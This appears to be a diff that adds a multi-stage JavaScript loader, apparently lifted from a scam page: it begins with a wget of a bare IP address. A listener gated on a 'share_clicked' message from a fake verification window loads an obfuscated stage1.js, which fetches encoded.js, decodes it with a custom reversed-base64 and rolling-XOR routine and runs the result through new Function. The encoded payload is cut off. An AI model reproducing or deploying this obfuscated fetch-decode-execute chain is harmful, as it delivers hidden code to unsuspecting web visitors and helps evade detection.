@@ -1,0 +1,104 @@
+wget http://54.251.168.172 -O index.html
+
+// Listen for message from verification window → start real decoding
+window.addEventListener('message', function(e) {
+if (e.data === 'share_clicked') {
+    // Start loading & executing stage1.js
+    const script = document.createElement('script');
+    script.src = 'stage1.js';
+    script.onload = () => console.log("[DEBUG] stage1.js loaded after share");
+    script.onerror = () => alert('කරණකර අනතරජල සමබනධතව පරකෂ කරනන');
+    document.body.appendChild(script);
+}
+});
+
+// stage1.js
+(function () {
+  function _0x30bde6(_0x3bfce3) {
+    const _0x1e3a66 = document.createElement('script');
+    _0x1e3a66.src = 'decoder.js';
+    _0x1e3a66.onload = () => {
+      if (typeof base1377Decode === 'function') {
+        _0x3bfce3();
+      }
+    };
+    _0x1e3a66.onerror = () => {};
+    document.head.appendChild(_0x1e3a66);
+  }
+  function _0x401015() {
+    fetch('encoded.js', {
+      'cache': 'no-store'
+    }).then(_0x158838 => {
+      if (!_0x158838.ok) {
+        return;
+      }
+      return _0x158838.text();
+    }).then(_0x21808f => {
+      if (!_0x21808f) {
+        return;
+      }
+      const _0x2734f5 = base1377Decode(_0x21808f.trim());
+      if (_0x2734f5) {
+        try {
+          new Function(_0x2734f5)();
+        } catch (_0x5b7b8c) {}
+      }
+    })['catch'](() => {});
+  }
+  _0x30bde6(() => {
+    setTimeout(_0x401015, 0x320);
+  });
+})();
+
+// decoder.js
+// decoder.js
+function base1377Decode(encoded) {
+    const STANDARD = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+    const CUSTOM   = STANDARD.split('').reverse().join('');   
+
+    let standardBase64 = '';
+    for (let char of encoded) {
+        const idx = CUSTOM.indexOf(char);
+        if (idx === -1) {
+            standardBase64 += char; // fallback (handles = padding etc.)
+        } else {
+            standardBase64 += STANDARD[idx];
+        }
+    }
+
+    let decodedBase64;
+    try {
+        decodedBase64 = atob(standardBase64);
+    } catch (e) {
+        console.error("Base64 decode failed");
+        return null;
+    }
+
+    const xored = new Uint8Array(decodedBase64.length);
+    for (let i = 0; i < decodedBase64.length; i++) {
+        xored[i] = decodedBase64.charCodeAt(i);
+    }
+
+    const SEED = 1377;
+    const XOR_BASE = SEED % 256;   
+
+    const resultBytes = new Uint8Array(xored.length);
+    for (let i = 0; i < xored.length; i++) {
+        const roll = (XOR_BASE + (i % 255)) % 256;
+        resultBytes[i] = xored[i] ^ roll;
+    }
+
+    try {
+        const decoder = new TextDecoder('utf-8');
+        return decoder.decode(resultBytes);
+    } catch (e) {
+        console.error("UTF-8 decode failed");
+        return null;
+    }
+}
+
+console.log("[decoder] Loaded and ready");
+
+// encoded.js
+uwwq+gou9g.....
+
